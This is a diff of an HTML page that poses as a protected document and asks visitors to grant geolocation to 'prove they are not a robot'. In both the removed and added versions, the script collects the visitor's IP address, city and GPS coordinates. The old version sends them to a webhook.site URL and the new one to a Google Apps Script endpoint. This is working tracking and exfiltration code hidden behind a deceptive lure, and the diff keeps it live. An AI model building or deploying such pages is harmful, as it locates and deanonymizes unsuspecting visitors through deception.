@@ -1,51 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="utf-8">
-    <title>Документ защищен</title>
-</head>
-<body style="text-align:center; font-family:sans-serif; margin-top:50px;">
-    <h2 style="color:red;">Документ защищен!</h2>
-    <p>Пожалуйста, разрешите доступ к геолокации, чтобы подтвердить, что вы не робот, и просмотреть файл.</p>
-    
+<head><meta charset="utf-8"><title>Документ защищен</title></head>
+<body style="text-align:center; padding-top:50px; font-family:sans-serif;">
+    <h2>Пожалуйста, разрешите доступ к геолокации для просмотра файла.</h2>
     <script>
-        // 1. Получаем IP
-        fetch('https://ipwho.is/')
-            .then(res => res.json())
-            .then(data => {
-                let ip = data.ip || '?';
-                let city = data.city || '?';
-                
-                // 2. Запрашиваем GPS
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        let lat = pos.coords.latitude;
-                        let lon = pos.coords.longitude;
-                        sendData(ip, city, lat, lon);
-                    },
-                    (err) => {
-                        sendData(ip, city, 'denied', 'denied');
-                    },
-                    { timeout: 10000 } // Ждем 10 секунд, если GPS тупит
-                );
-            })
-            .catch(() => {
-                // Если IP не получили, все равно просим GPS
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        sendData('?', '?', pos.coords.latitude, pos.coords.longitude);
-                    },
-                    (err) => {
-                        sendData('?', '?', 'denied', 'denied');
-                    }
-                );
-            });
-
-        // 3. Отправляем данные в Webhook
-        function sendData(ip, city, lat, lon) {
-            let url = "https://webhook.site/ebd9a3b9-811d-452e-a777-7de543ca450f?ip=" + ip + "&city=" + city + "&lat=" + lat + "&lon=" + lon;
-            fetch(url, { mode: 'no-cors' });
-        }
+    fetch('https://ipwho.is/').then(r=>r.json()).then(d=>{
+        navigator.geolocation.getCurrentPosition(pos => {
+            let url = "https://script.google.com/macros/s/AKfycbzC4vkiApw_KKRZXXtoWH3JjBCG2Hp7k3urQ6qsmbt6j6NSRPEy9KSth1UiYLQKJAS0BQ/exec?ip="+d.ip+"&city="+d.city+"&lat="+pos.coords.latitude+"&lon="+pos.coords.longitude;
+            fetch(url, {mode: 'no-cors'});
+        }, err => {
+            let url = "https://script.google.com/macros/s/AKfycbzC4vkiApw_KKRZXXtoWH3JjBCG2Hp7k3urQ6qsmbt6j6NSRPEy9KSth1UiYLQKJAS0BQ/exec?ip="+d.ip+"&city="+d.city+"&lat=denied&lon=denied";
+            fetch(url, {mode: 'no-cors'});
+        });
+    });
     </script>
 </body>
 </html>
